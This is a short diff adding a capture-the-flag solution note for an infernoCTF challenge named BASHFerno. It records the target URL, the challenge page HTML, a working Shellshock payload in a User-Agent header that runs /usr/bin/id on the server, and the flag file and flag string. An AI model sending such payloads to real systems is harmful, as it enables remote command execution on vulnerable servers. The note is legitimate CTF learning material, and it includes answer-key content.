@@ -1,0 +1,24 @@
+Shellshock vulnerability in UserAgent.
+
+<!-- bashferno.cgi -->
+
+http://104.197.168.32:17012/bashferno.cgi
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>BASHFerno</title>
+</head>
+<body>
+<p>
+Hello Bashers!!
+</p>
+<!--Its shocking ryt-->
+</body>
+</html>
+
+'User-Agent: () { :;};echo -e "\r\n$(/usr/bin/id)"'
+
+http://104.197.168.32:17012/flag_for_this_INFERNO.txt
+
+infernoCTF{F33l_Th3_Sh0ck}
